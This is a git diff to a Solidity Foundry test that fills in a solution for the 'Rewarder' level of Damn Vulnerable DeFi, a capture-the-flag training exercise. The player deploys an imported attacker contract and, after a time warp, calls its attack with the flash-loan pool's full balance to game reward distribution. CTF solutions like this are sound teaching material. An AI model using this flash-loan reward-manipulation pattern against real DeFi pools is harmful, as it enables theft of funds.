@@ -4,6 +4,7 @@ pragma solidity ^0.8.0;
 import "@test/BaseTest.sol";
 import "@src/damn-vulnerable-defi/the-rewarder/FlashLoanerPool.sol";
 import "@src/damn-vulnerable-defi/the-rewarder/TheRewarderPool.sol";
+import "@src/damn-vulnerable-defi/the-rewarder/RewarderAttacker.sol";
 import "src/damn-vulnerable-defi/DamnValuableToken.sol";
 
 contract TheRewarderTest is BaseTest {
@@ -86,6 +87,23 @@ contract TheRewarderTest is BaseTest {
 
   function testRewarderPool() public {
     /** CODE YOUR SOLUTION HERE */
+
+    // Alice, Bob, Charlie and David deposit tokens again, to play another round
+    uint256 depositAmount = 100 * 10e18;
+    for (uint8 i; i < users.length; ++i) {
+      vm.startPrank(deployer);
+      liquidityToken.transfer(users[i], depositAmount);
+      vm.startPrank(users[i]);
+      liquidityToken.approve(address(rewarderPool), depositAmount);
+      rewarderPool.deposit(depositAmount);
+    }
+
+    vm.startPrank(player);
+    uint256 flashAmount = liquidityToken.balanceOf(address(flashLoanPool));
+    RewarderAttacker attackerContract = new RewarderAttacker(address(flashLoanPool), address(rewarderPool), address(liquidityToken));
+    
+    vm.warp(block.timestamp + 5 days);
+    attackerContract.attack(flashAmount);
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
     // Only one round must have taken place
